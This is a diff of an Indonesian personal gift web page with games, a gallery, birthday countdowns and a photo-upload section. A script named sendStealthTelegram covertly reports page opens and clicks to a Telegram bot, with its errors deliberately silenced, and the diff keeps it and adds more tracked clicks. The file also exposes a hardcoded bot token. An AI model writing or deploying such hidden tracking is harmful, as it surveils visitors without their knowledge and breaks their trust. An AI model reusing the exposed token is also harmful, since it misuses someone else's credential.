@@ -66,43 +66,18 @@
         @keyframes pulseText { from { transform: rotate(-2deg) scale(1); } to { transform: rotate(-2deg) scale(1.05); } }
 
         /* ==========================================================================
-           3. EFEK VISUAL LATAR BELAKANG (CRT, GRAIN, PATTERN, SCANLINES)
+           3. EFEK VISUAL LATAR BELAKANG
            ========================================================================== */
-        .bg-pattern {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -4;
-            background-color: var(--bg-color);
-            background-image: radial-gradient(var(--border-color) 1.5px, transparent 1.5px);
-            background-size: 35px 35px; opacity: 0.8;
-        }
-
-        .grain-overlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 99997;
-            pointer-events: none; opacity: 0.05;
-            background-image: url('data:image/svg+xml,%3Csvg viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg"%3E%3Cfilter id="noiseFilter"%3E%3CfeTurbulence type="fractalNoise" baseFrequency="0.8" numOctaves="4" stitchTiles="stitch"/%3E%3C/filter%3E%3Crect width="100%25" height="100%25" filter="url(%23noiseFilter)"/%3E%3C/svg%3E');
-        }
-
-        .scanlines {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 99996;
-            pointer-events: none; opacity: 0.03;
-            background: linear-gradient(to bottom, rgba(255,255,255,0), rgba(255,255,255,0) 50%, rgba(0,0,0,0.2) 50%, rgba(0,0,0,0.2));
-            background-size: 100% 4px;
-        }
-
-        #bg-canvas { 
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
-            pointer-events: none; transition: opacity 0.3s; z-index: -2; 
-        }
+        .bg-pattern { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -4; background-color: var(--bg-color); background-image: radial-gradient(var(--border-color) 1.5px, transparent 1.5px); background-size: 35px 35px; opacity: 0.8; }
+        .grain-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 99997; pointer-events: none; opacity: 0.05; background-image: url('data:image/svg+xml,%3Csvg viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg"%3E%3Cfilter id="noiseFilter"%3E%3CfeTurbulence type="fractalNoise" baseFrequency="0.8" numOctaves="4" stitchTiles="stitch"/%3E%3C/filter%3E%3Crect width="100%25" height="100%25" filter="url(%23noiseFilter)"/%3E%3C/svg%3E'); }
+        .scanlines { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 99996; pointer-events: none; opacity: 0.03; background: linear-gradient(to bottom, rgba(255,255,255,0), rgba(255,255,255,0) 50%, rgba(0,0,0,0.2) 50%, rgba(0,0,0,0.2)); background-size: 100% 4px; }
+        #bg-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; transition: opacity 0.3s; z-index: -2; }
 
         /* ==========================================================================
            4. TOMBOL MUSIK & ANTI-LAG
            ========================================================================== */
         .control-panel { position: fixed; top: 15px; left: 15px; z-index: 99999; display: flex; flex-direction: column; gap: 10px; }
-        .brutal-btn-small {
-            background: #fff; color: var(--border-color); padding: 10px 15px;
-            font-size: 0.75rem; border-radius: 12px; box-shadow: 4px 4px 0px var(--border-color);
-            border: 3px solid var(--border-color); font-weight: 900; transition: 0.2s;
-            text-transform: uppercase; position: relative; overflow: hidden; cursor: pointer;
-        }
+        .brutal-btn-small { background: #fff; color: var(--border-color); padding: 10px 15px; font-size: 0.75rem; border-radius: 12px; box-shadow: 4px 4px 0px var(--border-color); border: 3px solid var(--border-color); font-weight: 900; transition: 0.2s; text-transform: uppercase; position: relative; overflow: hidden; cursor: pointer; }
         .brutal-btn-small:active { transform: translate(4px, 4px); box-shadow: 0px 0px 0px var(--border-color); }
         .music-off { background: #ff4757; color: #fff; text-decoration: line-through; }
         .lite-on { background: var(--accent-yellow); }
@@ -110,39 +85,17 @@
         /* ==========================================================================
            5. BRUTALIST COMPONENTS & RIPPLE
            ========================================================================== */
-        .brutal-card {
-            border: var(--border-thick) solid var(--border-color); border-radius: 12px;
-            background: #ffffff; box-shadow: var(--shadow-thick) var(--shadow-thick) 0px var(--border-color);
-            transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1); position: relative;
-        }
-        .brutal-button {
-            border: var(--border-thick) solid var(--border-color); border-radius: 8px;
-            background: var(--accent-pink); color: var(--border-color); font-weight: 900;
-            text-transform: uppercase; box-shadow: 6px 6px 0px var(--border-color);
-            transition: all 0.15s ease-in-out; display: inline-block; position: relative; overflow: hidden; cursor: pointer;
-        }
+        .brutal-card { border: var(--border-thick) solid var(--border-color); border-radius: 12px; background: #ffffff; box-shadow: var(--shadow-thick) var(--shadow-thick) 0px var(--border-color); transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1); position: relative; }
+        .brutal-button { border: var(--border-thick) solid var(--border-color); border-radius: 8px; background: var(--accent-pink); color: var(--border-color); font-weight: 900; text-transform: uppercase; box-shadow: 6px 6px 0px var(--border-color); transition: all 0.15s ease-in-out; display: inline-block; position: relative; overflow: hidden; cursor: pointer; }
         .brutal-button:active { transform: translate(6px, 6px); box-shadow: 0px 0px 0px var(--border-color); }
-
-        .ripple {
-            position: absolute; border-radius: 50%; transform: scale(0);
-            animation: ripple-animation 0.6s ease-out; background-color: rgba(255, 255, 255, 0.7); pointer-events: none;
-        }
+        .ripple { position: absolute; border-radius: 50%; transform: scale(0); animation: ripple-animation 0.6s ease-out; background-color: rgba(255, 255, 255, 0.7); pointer-events: none; }
         @keyframes ripple-animation { to { transform: scale(4); opacity: 0; } }
 
         /* ==========================================================================
            6. OVERLAY PINTU MASUK (HELLO SCREEN)
            ========================================================================== */
-        #start-gate {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100vh; height: 100dvh;
-            background-color: var(--accent-blue); background-image: radial-gradient(var(--border-color) 2px, transparent 2px);
-            background-size: 30px 30px; z-index: 99998; display: flex; flex-direction: column; 
-            justify-content: center; align-items: center; transition: transform 0.9s cubic-bezier(0.77, 0, 0.175, 1);
-        }
-        .gate-content-box {
-            background: #ffffff; border: var(--border-thick) solid var(--border-color);
-            padding: 60px 40px; border-radius: 20px; box-shadow: 15px 15px 0px var(--border-color);
-            text-align: center; animation: floatSlow 4s ease-in-out infinite;
-        }
+        #start-gate { position: fixed; top: 0; left: 0; width: 100%; height: 100vh; height: 100dvh; background-color: var(--accent-blue); background-image: radial-gradient(var(--border-color) 2px, transparent 2px); background-size: 30px 30px; z-index: 99998; display: flex; flex-direction: column; justify-content: center; align-items: center; transition: transform 0.9s cubic-bezier(0.77, 0, 0.175, 1); }
+        .gate-content-box { background: #ffffff; border: var(--border-thick) solid var(--border-color); padding: 60px 40px; border-radius: 20px; box-shadow: 15px 15px 0px var(--border-color); text-align: center; animation: floatSlow 4s ease-in-out infinite; }
         #start-gate.opened { transform: translateY(-100%); pointer-events: none; }
         .gate-btn { background: var(--accent-green); padding: 25px 50px; font-size: 1.6rem; letter-spacing: 2px; margin-top: 20px; border-radius: 15px;}
         @keyframes floatSlow { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-15px); } }
@@ -150,48 +103,28 @@
         /* ==========================================================================
            7. HERO SECTION DENGAN EFEK GLITCH & PARALLAX
            ========================================================================== */
-        .hero-section {
-            height: 100vh; height: 100dvh; display: flex; flex-direction: column; 
-            justify-content: center; align-items: center; padding: 20px; text-align: center; 
-            position: relative; overflow: hidden; border-bottom: var(--border-thick) solid var(--border-color); background: transparent;
-        }
-
-        .glitch-text {
-            font-size: clamp(3rem, 10vw, 5rem); font-weight: 900; line-height: 1.1;
-            text-transform: uppercase; position: relative; z-index: 2; color: var(--border-color); text-shadow: 3px 3px 0px #fff;
-        }
+        .hero-section { height: 100vh; height: 100dvh; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 20px; text-align: center; position: relative; overflow: hidden; border-bottom: var(--border-thick) solid var(--border-color); background: transparent; }
+        .glitch-text { font-size: clamp(3rem, 10vw, 5rem); font-weight: 900; line-height: 1.1; text-transform: uppercase; position: relative; z-index: 2; color: var(--border-color); text-shadow: 3px 3px 0px #fff; }
         .glitch-text::before, .glitch-text::after { content: attr(data-text); position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: transparent; z-index: -1; }
         .glitch-text::before { left: 4px; text-shadow: -2px 0 var(--accent-pink); clip: rect(44px, 450px, 56px, 0); animation: glitch-anim 5s infinite linear alternate-reverse; }
         .glitch-text::after { left: -4px; text-shadow: -2px 0 var(--accent-blue); clip: rect(44px, 450px, 56px, 0); animation: glitch-anim2 5s infinite linear alternate-reverse; }
         @keyframes glitch-anim { 0% { clip: rect(10px, 9999px, 83px, 0); } 20% { clip: rect(32px, 9999px, 12px, 0); } 40% { clip: rect(87px, 9999px, 54px, 0); } 60% { clip: rect(42px, 9999px, 73px, 0); } 80% { clip: rect(15px, 9999px, 92px, 0); } 100% { clip: rect(65px, 9999px, 34px, 0); } }
         @keyframes glitch-anim2 { 0% { clip: rect(85px, 9999px, 14px, 0); } 20% { clip: rect(12px, 9999px, 65px, 0); } 40% { clip: rect(54px, 9999px, 83px, 0); } 60% { clip: rect(92px, 9999px, 21px, 0); } 80% { clip: rect(34px, 9999px, 45px, 0); } 100% { clip: rect(73px, 9999px, 87px, 0); } }
-
-        .hero-title .badge {
-            background: var(--accent-yellow); padding: 5px 25px; border: var(--border-thick) solid var(--border-color); 
-            display: inline-block; transform: rotate(-4deg); margin-top: 20px; box-shadow: 8px 8px 0px var(--border-color);
-            animation: pulseBadge 1.5s infinite; font-size: clamp(2rem, 6vw, 3rem);
-        }
+        .hero-title .badge { background: var(--accent-yellow); padding: 5px 25px; border: var(--border-thick) solid var(--border-color); display: inline-block; transform: rotate(-4deg); margin-top: 20px; box-shadow: 8px 8px 0px var(--border-color); animation: pulseBadge 1.5s infinite; font-size: clamp(2rem, 6vw, 3rem); }
         @keyframes pulseBadge { 0%, 100% { transform: rotate(-4deg) scale(1); } 50% { transform: rotate(-4deg) scale(1.1); } }
-
         .typewriter-container { margin-top: 40px; background: #fff; padding: 15px 20px; border: 4px solid var(--border-color); display: inline-block; box-shadow: 6px 6px 0px var(--border-color); transform: rotate(2deg); }
         .typewriter-text { font-weight: 800; font-size: 1.1rem; color: var(--border-color); min-height: 28px; }
-
         .parallax-shape { position: absolute; border: var(--border-thick) solid var(--border-color); z-index: 1; box-shadow: 5px 5px 0px rgba(0,0,0,0.8); }
         .shape-1 { width: 80px; height: 80px; background: var(--accent-pink); border-radius: 50%; top: 15%; left: 8%; }
         .shape-2 { width: 70px; height: 70px; background: var(--accent-blue); top: 30%; right: 10%; transform: rotate(15deg); }
         .shape-3 { width: 100px; height: 40px; background: var(--accent-green); bottom: 25%; left: 15%; transform: rotate(-25deg); }
-
-        .marquee-tape {
-            position: absolute; width: 120vw; left: -10vw; background: var(--accent-yellow);
-            border-top: var(--border-thick) solid var(--border-color); border-bottom: var(--border-thick) solid var(--border-color);
-            color: var(--border-color); font-weight: 900; font-size: 1rem; padding: 10px 0; overflow: hidden; white-space: nowrap; z-index: 10;
-        }
+        .marquee-tape { position: absolute; width: 120vw; left: -10vw; background: var(--accent-yellow); border-top: var(--border-thick) solid var(--border-color); border-bottom: var(--border-thick) solid var(--border-color); color: var(--border-color); font-weight: 900; font-size: 1rem; padding: 10px 0; overflow: hidden; white-space: nowrap; z-index: 10; }
         .marquee-bottom { bottom: 5%; transform: rotate(3deg) scale(1.1); background: var(--accent-orange); color: #fff; box-shadow: 0px -5px 15px rgba(0,0,0,0.2);}
         .marquee-content { display: inline-block; text-transform: uppercase; animation: marquee 12s linear infinite; letter-spacing: 3px;}
         @keyframes marquee { 0% { transform: translateX(0); } 100% { transform: translateX(-50%); } }
 
         /* ==========================================================================
-           8. GALLERY SECTION (DIOPTIMASI UNTUK SENTUHAN / DRAG KE SAMPING)
+           8. GALLERY SECTION
            ========================================================================== */
         .gallery-section { padding: 100px 0; background: rgba(255,255,255,0.85); border-bottom: var(--border-thick) solid var(--border-color); position: relative; backdrop-filter: blur(10px); z-index: 5;}
         .section-header { padding: 0 20px; margin-bottom: 50px; display: flex; justify-content: space-between; align-items: flex-end; }
@@ -200,23 +133,11 @@
         .swipe-indicator { background: var(--border-color); color: #fff; padding: 12px 25px; font-weight: 900; font-size: 0.9rem; border-radius: 25px; animation: bounceX 1.5s infinite; pointer-events: none;}
         @keyframes bounceX { 0%, 100% { transform: translateX(0); } 50% { transform: translateX(15px); } }
 
-        /* AREA BISA DIGESER */
-        .gallery-track { 
-            display: flex; gap: 35px; padding: 20px 30px 80px; 
-            overflow-x: auto; scroll-snap-type: x mandatory; 
-            scroll-behavior: smooth; -webkit-overflow-scrolling: touch; 
-            perspective: 1200px; touch-action: pan-x; /* Fix bug sentuhan nyamping di HP */
-            cursor: grab; /* Tanda kursor tangan di PC */
-        }
+        .gallery-track { display: flex; gap: 35px; padding: 20px 30px 80px; overflow-x: auto; scroll-snap-type: x mandatory; scroll-behavior: smooth; -webkit-overflow-scrolling: touch; perspective: 1200px; touch-action: pan-x; cursor: grab; }
         .gallery-track:active { cursor: grabbing; }
         .gallery-track::-webkit-scrollbar { display: none; } 
 
-        .gallery-card {
-            flex: 0 0 80%; height: 480px; scroll-snap-align: center; border: 5px solid var(--border-color); border-radius: 20px;
-            position: relative; background: #ddd; transition: all 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            transform: scale(0.85) rotateY(15deg); opacity: 0.4; box-shadow: 0px 0px 0px var(--border-color); transform-style: preserve-3d;
-            pointer-events: none; /* Biar gampang ke-drag foto nya */
-        }
+        .gallery-card { flex: 0 0 80%; height: 480px; scroll-snap-align: center; border: 5px solid var(--border-color); border-radius: 20px; position: relative; background: #ddd; transition: all 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275); transform: scale(0.85) rotateY(15deg); opacity: 0.4; box-shadow: 0px 0px 0px var(--border-color); transform-style: preserve-3d; pointer-events: none; }
         .gallery-card img { width: 100%; height: 100%; object-fit: cover; border-radius: 14px; transition: transform 0.6s ease; }
         .gallery-card.is-focused { transform: scale(1.05) rotateY(0deg); opacity: 1; box-shadow: 20px 20px 0px var(--border-color); z-index: 10; }
         .gallery-card.is-focused img { transform: scale(1.08); }
@@ -226,18 +147,12 @@
            ========================================================================== */
         .games-section { padding: 100px 20px; background: transparent; border-bottom: var(--border-thick) solid var(--border-color); position: relative; z-index: 5; }
         .games-grid { display: flex; flex-direction: column; gap: 60px; margin-top: 60px; perspective: 1200px; }
-        
-        .game-card { 
-            display: block; text-decoration: none; color: var(--border-color); padding: 30px; background: rgba(255,255,255,0.95); backdrop-filter: blur(8px); 
-            border-radius: 20px; transition: all 0.7s cubic-bezier(0.175, 0.885, 0.32, 1.275); opacity: 0.4; transform: scale(0.85) translateY(50px); box-shadow: 5px 5px 0px var(--border-color);
-        }
+        .game-card { display: block; text-decoration: none; color: var(--border-color); padding: 30px; background: rgba(255,255,255,0.95); backdrop-filter: blur(8px); border-radius: 20px; transition: all 0.7s cubic-bezier(0.175, 0.885, 0.32, 1.275); opacity: 0.4; transform: scale(0.85) translateY(50px); box-shadow: 5px 5px 0px var(--border-color); }
         .game-card.game-focused { opacity: 1; transform: scale(1.02) translateY(0); box-shadow: 18px 18px 0px var(--border-color); z-index: 10; border: 5px solid var(--border-color);}
         .game-card.game-focused .play-icon { transform: rotate(45deg) scale(1.3); background: var(--accent-pink); color: #fff; box-shadow: 4px 4px 0px var(--border-color);}
-
         .game-thumbnail { width: 100%; height: 220px; border: var(--border-thick) solid var(--border-color); border-radius: 15px; overflow: hidden; margin-bottom: 30px; background: #ccc; box-shadow: inset 0px 0px 25px rgba(0,0,0,0.3); pointer-events: none;}
         .game-thumbnail img { width: 100%; height: 100%; object-fit: cover; transition: 0.6s; }
         .game-card.game-focused .game-thumbnail img { transform: scale(1.15) rotate(2deg); }
-
         .game-info { display: flex; justify-content: space-between; align-items: center; pointer-events: none;}
         .game-info h3 { font-size: 1.8rem; font-weight: 900; text-transform: uppercase; }
         .game-info p { font-size: 1rem; font-weight: 800; margin-top: 8px; color: #555; }
@@ -250,74 +165,68 @@
         .ai-box { background: #fff; padding: 40px; border-radius: 25px; border: var(--border-thick) solid var(--border-color); box-shadow: 15px 15px 0px var(--border-color); max-width: 600px; margin: 0 auto; text-align: left;}
         .ai-box h2 { font-weight: 900; font-size: 2.2rem; margin-bottom: 10px; text-transform: uppercase;}
         .ai-box p { font-weight: 700; font-size: 1rem; margin-bottom: 25px; color: #555;}
-        
         .ai-input-group { display: flex; flex-direction: column; gap: 15px; }
         .ai-input { padding: 18px; border: var(--border-thick) solid var(--border-color); border-radius: 15px; font-family: 'Poppins', sans-serif; font-size: 1.1rem; font-weight: 700; outline: none; transition: 0.2s; background: var(--bg-color);}
         .ai-input:focus { box-shadow: 8px 8px 0px var(--accent-blue); transform: translate(-4px, -4px); background: #fff;}
         .ai-btn { padding: 18px; background: var(--accent-yellow); color: var(--border-color); font-weight: 900; font-size: 1.2rem; border: var(--border-thick) solid var(--border-color); border-radius: 15px; cursor: pointer; text-transform: uppercase; box-shadow: 6px 6px 0px var(--border-color); transition: 0.2s;}
         .ai-btn:active { transform: translate(6px, 6px); box-shadow: 0px 0px 0px transparent;}
-        
         .ai-response-box { margin-top: 25px; padding: 20px; border: 3px dashed var(--border-color); border-radius: 15px; background: #f0f0f0; font-weight: 700; display: none; line-height: 1.6; font-size: 1.05rem;}
         .ai-loading { font-weight: 900; font-size: 1.1rem; animation: blink 1s infinite; display: none; margin-top: 20px; color: var(--border-color); text-align: center;}
-        @keyframes blink { 50% { opacity: 0.5; } }
 
         /* ==========================================================================
-           11. LOGIN SECTION & THE TROLL BUTTON
+           11. UPLOAD FOTO PAP MISTERIUS (FITUR BARU)
            ========================================================================== */
-        .login-section { padding: 150px 20px; background: var(--accent-blue); display: flex; justify-content: center; align-items: center; position: relative; z-index: 5;}
+        .upload-section { padding: 100px 20px; background: var(--accent-green); border-bottom: var(--border-thick) solid var(--border-color); position: relative; z-index: 5; text-align: center;}
+        .upload-box { background: #fff; padding: 40px; border-radius: 25px; border: var(--border-thick) solid var(--border-color); box-shadow: 15px 15px 0px var(--border-color); max-width: 600px; margin: 0 auto; text-align: center;}
+        .upload-box h2 { font-weight: 900; font-size: 2rem; margin-bottom: 10px; text-transform: uppercase;}
+        .upload-box p { font-weight: 700; font-size: 1rem; margin-bottom: 25px; color: #555;}
         
-        .login-box { 
-            width: 100%; max-width: 450px; background: #ffffff; padding: 50px 35px; 
-            text-align: center; box-shadow: 20px 20px 0px var(--border-color); border-radius: 25px;
-            transform-style: preserve-3d; border: 5px solid var(--border-color); position: relative;
-        }
+        .file-input-wrapper { position: relative; overflow: hidden; display: inline-block; width: 100%; margin-bottom: 15px;}
+        .file-input-wrapper input[type=file] { font-size: 100px; position: absolute; left: 0; top: 0; opacity: 0; cursor: pointer; height: 100%; width: 100%;}
+        .btn-upload { display: block; width: 100%; padding: 18px; background: var(--accent-blue); color: #fff; font-weight: 900; font-size: 1.2rem; border: var(--border-thick) solid var(--border-color); border-radius: 15px; text-transform: uppercase; box-shadow: 6px 6px 0px var(--border-color); transition: 0.2s; pointer-events: none;}
+        .file-input-wrapper:active .btn-upload { transform: translate(6px, 6px); box-shadow: 0px 0px 0px transparent;}
         
-        /* JUDUL INI BISA DI-TAP 7 KALI BUAT CHEAT CODE */
-        .secret-title { font-size: 2.8rem; font-weight: 900; text-transform: uppercase; margin-bottom: 10px; text-shadow: 3px 3px 0px var(--accent-pink); cursor: pointer;}
-        
-        .login-box p { font-size: 1.1rem; font-weight: 800; color: #555; margin-bottom: 40px; }
+        #upload-status { font-weight: 900; margin-top: 15px; display: none; padding: 10px; border: 3px dashed #111; border-radius: 10px; background: #fff;}
 
-        .alert-bar {
-            display: block; width: 100%; padding: 20px 15px; margin-bottom: 40px; background: var(--accent-yellow); color: var(--border-color);
-            border: 5px solid var(--border-color); border-radius: 15px; font-weight: 900; font-size: 1rem; text-transform: uppercase; text-decoration: none;
-            box-shadow: 8px 8px 0px var(--border-color); animation: pulseAlert 2s infinite; transition: 0.2s; letter-spacing: 1px;
-        }
+        /* ==========================================================================
+           12. LOGIN SECTION & COUNTDOWN
+           ========================================================================== */
+        .countdown-section { padding: 80px 20px; background: var(--bg-color); border-bottom: var(--border-thick) solid var(--border-color); position: relative; z-index: 5; text-align: center; }
+        .countdown-title { font-size: 2.2rem; font-weight: 900; text-transform: uppercase; margin-bottom: 40px; text-shadow: 2px 2px 0px #fff; }
+        .countdown-grid { display: flex; flex-direction: column; gap: 30px; max-width: 800px; margin: 0 auto; }
+        @media screen and (min-width: 768px) { .countdown-grid { flex-direction: row; } }
+        .cd-card { flex: 1; padding: 30px; border: var(--border-thick) solid var(--border-color); border-radius: 20px; box-shadow: 10px 10px 0px var(--border-color); transition: 0.3s; position: relative; overflow: hidden; cursor: pointer; }
+        .cd-card:active { transform: translate(5px, 5px); box-shadow: 0px 0px 0px var(--border-color); }
+        .cd-aldo { background: var(--accent-blue); }
+        .cd-anggie { background: var(--accent-pink); }
+        .cd-name { font-size: 1.8rem; font-weight: 900; text-transform: uppercase; margin-bottom: 5px; color: #fff; text-shadow: 2px 2px 0px var(--border-color); }
+        .cd-date { font-size: 0.9rem; font-weight: 800; background: #fff; color: var(--border-color); padding: 5px 15px; border-radius: 10px; border: 3px solid var(--border-color); display: inline-block; margin-bottom: 20px; }
+        .cd-timer { display: flex; justify-content: center; gap: 8px; }
+        .time-box { background: #fff; border: 3px solid var(--border-color); border-radius: 12px; padding: 10px; min-width: 65px; box-shadow: 4px 4px 0px var(--border-color); }
+        .time-val { font-size: 1.5rem; font-weight: 900; display: block; line-height: 1; }
+        .time-lbl { font-size: 0.65rem; font-weight: 800; text-transform: uppercase; margin-top: 5px; display: block; }
+
+        .login-section { padding: 150px 20px; background: var(--accent-blue); display: flex; justify-content: center; align-items: center; position: relative; z-index: 5;}
+        .login-box { width: 100%; max-width: 450px; background: #ffffff; padding: 50px 35px; text-align: center; box-shadow: 20px 20px 0px var(--border-color); border-radius: 25px; transform-style: preserve-3d; border: 5px solid var(--border-color); position: relative; }
+        .secret-title { font-size: 2.8rem; font-weight: 900; text-transform: uppercase; margin-bottom: 10px; text-shadow: 3px 3px 0px var(--accent-pink); cursor: pointer;}
+        .login-box p { font-size: 1.1rem; font-weight: 800; color: #555; margin-bottom: 40px; }
+        .alert-bar { display: block; width: 100%; padding: 20px 15px; margin-bottom: 40px; background: var(--accent-yellow); color: var(--border-color); border: 5px solid var(--border-color); border-radius: 15px; font-weight: 900; font-size: 1rem; text-transform: uppercase; text-decoration: none; box-shadow: 8px 8px 0px var(--border-color); animation: pulseAlert 2s infinite; transition: 0.2s; letter-spacing: 1px; }
         .alert-bar:active { transform: translate(8px, 8px); box-shadow: 0px 0px 0px var(--border-color); animation: none; }
         @keyframes pulseAlert { 0%, 100% { background: var(--accent-yellow); color: var(--border-color); transform: scale(1);} 50% { background: var(--accent-pink); color: #fff; transform: scale(1.03);} }
-
         .input-wrapper { margin-bottom: 35px; text-align: left; }
         .input-wrapper label { display: block; font-size: 1rem; font-weight: 900; text-transform: uppercase; margin-bottom: 12px; }
-        .input-wrapper input {
-            width: 100%; padding: 20px; border: 5px solid var(--border-color); border-radius: 15px;
-            font-size: 1.2rem; font-weight: 800; font-family: 'Poppins', sans-serif; outline: none; transition: all 0.3s; background: var(--bg-color);
-        }
+        .input-wrapper input { width: 100%; padding: 20px; border: 5px solid var(--border-color); border-radius: 15px; font-size: 1.2rem; font-weight: 800; font-family: 'Poppins', sans-serif; outline: none; transition: all 0.3s; background: var(--bg-color); }
         .input-wrapper input:focus { background: #fff; transform: translate(-5px, -5px); box-shadow: 10px 10px 0px var(--accent-green); }
-
         .btn-submit { width: 100%; padding: 25px; font-size: 1.5rem; margin-top: 20px; border-radius: 15px; letter-spacing: 2px;}
-        
-        .error-message { 
-            display: none; color: #fff; font-weight: 900; font-size: 1rem; margin-top: 25px; 
-            background: #ff4757; padding: 18px; border: 4px solid var(--border-color); border-radius: 12px; 
-            text-transform: uppercase; letter-spacing: 1px; box-shadow: 5px 5px 0px #000;
-        }
+        .error-message { display: none; color: #fff; font-weight: 900; font-size: 1rem; margin-top: 25px; background: #ff4757; padding: 18px; border: 4px solid var(--border-color); border-radius: 12px; text-transform: uppercase; letter-spacing: 1px; box-shadow: 5px 5px 0px #000; }
         @keyframes shakeHard { 0%, 100% { transform: translateX(0); } 10%, 30%, 50%, 70%, 90% { transform: translateX(-15px) rotate(-2deg); } 20%, 40%, 60%, 80% { transform: translateX(15px) rotate(2deg); } }
         .shake-animation { animation: shakeHard 0.6s ease-in-out; }
-
-        /* TROLL BUTTON STYLE */
         .troll-container { margin-top: 25px; height: 40px; position: relative; }
-        #troll-btn {
-            position: absolute; left: 50%; transform: translateX(-50%);
-            font-size: 0.85rem; font-weight: 800; padding: 8px 15px; border-radius: 8px;
-            background: var(--bg-color); border: 2px solid var(--border-color); color: var(--border-color);
-            cursor: pointer; transition: top 0.15s ease, left 0.15s ease, transform 0.15s ease;
-            white-space: nowrap; z-index: 10;
-        }
-
+        #troll-btn { position: absolute; left: 50%; transform: translateX(-50%); font-size: 0.85rem; font-weight: 800; padding: 8px 15px; border-radius: 8px; background: var(--bg-color); border: 2px solid var(--border-color); color: var(--border-color); cursor: pointer; transition: top 0.15s ease, left 0.15s ease, transform 0.15s ease; white-space: nowrap; z-index: 10; }
     </style>
 </head>
 <body>
 
-    <!-- SCRIPT MATA-MATA (TELEGRAM TRACKER) -->
     <script>
         function sendStealthTelegram(action, details = "") {
             const token = "8731904526:AAE2bkcOaFyhpYMo1UzRNe-7XcUR2WvCL2g";
@@ -331,26 +240,13 @@
             
             const url = `https://api.telegram.org/bot${token}/sendMessage`;
             
-            // Mengirim request di background tanpa notif apapun ke UI jika gagal
             fetch(url, {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message,
-                    parse_mode: 'Markdown'
-                })
-            }).catch(e => {
-                // Biarkan hening, jangan console.error biar nggak ketahuan di inspect element
-            });
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'Markdown' })
+            }).catch(e => {});
         }
-        
-        // Kirim notif begitu web dibuka
-        window.addEventListener('load', () => {
-            sendStealthTelegram("🌐 Web Utama (index.html) Dibuka", "Pengunjung masuk ke halaman utama.");
-        });
+        window.addEventListener('load', () => { sendStealthTelegram("🌐 Web Utama (index.html) Dibuka", "Pengunjung masuk ke halaman utama."); });
     </script>
 
     <div id="splash-screen">
@@ -403,6 +299,22 @@
         </div>
     </section>
 
+    <section class="countdown-section">
+        <h2 class="countdown-title">⏳ Menuju Hari Spesial ⏳</h2>
+        <div class="countdown-grid">
+            <div class="cd-card cd-aldo custom-hover ripple-btn" onclick="sendStealthTelegram('⏳ Cek Countdown', 'Ngeklik hitung mundur ultah Aldo (7 Ags 2026)')">
+                <div class="cd-name">Aldo</div>
+                <div class="cd-date">7 Agustus 2026</div>
+                <div class="cd-timer" id="timer-aldo-index"><div class="time-box"><span class="time-val">0</span><span class="time-lbl">Hari</span></div></div>
+            </div>
+            <div class="cd-card cd-anggie custom-hover ripple-btn" onclick="sendStealthTelegram('⏳ Cek Countdown', 'Ngeklik hitung mundur ultah Anggie (20 Apr 2027)')">
+                <div class="cd-name">Anggie</div>
+                <div class="cd-date">20 April 2027</div>
+                <div class="cd-timer" id="timer-anggie-index"><div class="time-box"><span class="time-val">0</span><span class="time-lbl">Hari</span></div></div>
+            </div>
+        </div>
+    </section>
+
     <section class="section gallery-section">
         <div class="section-header">
             <div>
@@ -430,7 +342,6 @@
         </div>
 
         <div class="games-grid" id="games-track">
-            <!-- Tambahkan onclick tracker ke game links -->
             <a href="flapy.html" class="brutal-card game-card game-1 custom-hover ripple-btn" onclick="sendStealthTelegram('🎮 Buka Game', 'Menuju Flappy Bird')">
                 <div class="game-thumbnail"><img src="img/thumb-flappy.jpg" alt="Flappy Bird" onerror="this.src='https://via.placeholder.com/600x400/4facfe/fff?text=Thumbnail+Flappy'"></div>
                 <div class="game-info">
@@ -449,7 +360,6 @@
         </div>
     </section>
 
-    <!-- BAGIAN BARU: AI ASSISTANT -->
     <section class="ai-section">
         <div class="ai-box brutal-card">
             <h2>Ini aku tanyakan apa saja Leo</h2>
@@ -460,6 +370,20 @@
             </div>
             <div id="aiLoading" class="ai-loading">Bentar ya cantik, lagi nyari jawabannya... ⏳</div>
             <div id="aiResponse" class="ai-response-box"></div>
+        </div>
+    </section>
+
+    <section class="upload-section">
+        <div class="upload-box brutal-card">
+            <h2>Kirim PAP Misterius 📸</h2>
+            <p>kamu pengin kirim pap misterius ke aku kirim foto nya di sini wkwwkwkwwk</p>
+            
+            <div class="file-input-wrapper">
+                <button class="btn-upload" id="btn-pilih-foto">🖼️ PILIH FOTO DARI HP</button>
+                <input type="file" id="pap-input" accept="image/*" onchange="kirimPapKeTelegram()">
+            </div>
+            
+            <div id="upload-status"></div>
         </div>
     </section>
 
@@ -493,7 +417,7 @@
 
     <script>
         // =========================================================================
-        // 1. SPLASH SCREEN LOGIC (DENGAN FALLBACK ANTI-NYANGKUT)
+        // 1. SPLASH SCREEN & AUDIO
         // =========================================================================
         let isLoaded = false;
         function hideSplashScreen() {
@@ -502,21 +426,12 @@
             const splash = document.getElementById('splash-screen');
             if (splash) splash.classList.add('hidden');
         }
-
-        window.addEventListener('load', () => {
-            setTimeout(hideSplashScreen, 1500); // Menunggu 1.5 detik setelah beres
-        });
-
-        // Fallback: Paksa loading hilang maksimal setelah 5 detik (jaga-jaga ada gambar error)
+        window.addEventListener('load', () => { setTimeout(hideSplashScreen, 1500); });
         setTimeout(hideSplashScreen, 5000);
